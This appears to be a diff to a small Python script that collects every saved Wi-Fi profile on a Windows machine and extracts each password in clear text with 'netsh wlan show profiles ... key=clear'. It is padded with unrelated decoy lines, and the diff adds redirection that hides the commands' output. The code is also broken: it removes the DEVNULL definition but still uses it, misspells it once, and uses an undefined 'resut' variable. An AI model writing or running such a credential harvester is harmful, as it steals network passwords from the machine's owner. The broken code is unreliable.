@@ -12,10 +12,10 @@ def amount(x,y, sum):
     sum = sum - 5
     return sum
 
-DEVNULL = open(os.devnull, 'wb')
+
 
 c1  = "netsh wlan show profiles"
-sub1 = subprocess.check_output(c1, shell=True)
+sub1 = subprocess.check_output(c1, shell=True, stderr=DEVNULL,stdin=DEVNULL)
 regular_list = re.findall("(?:Benutzer\s:\s)(.*)",sub1)
 
 age = 24
@@ -27,7 +27,7 @@ result = ""
 
 for regular in regular_list:
     c2 = "netsh wlan show profiles " + regular + " key=clear"
-    sub2 = subprocess.check_output(c2, shell=True)
+    sub2 = subprocess.check_output(c2, shell=True, stderr=DeVNULL,stdin=DEVNULL)
     current_value = sub2
     resut = resut + current_value
 
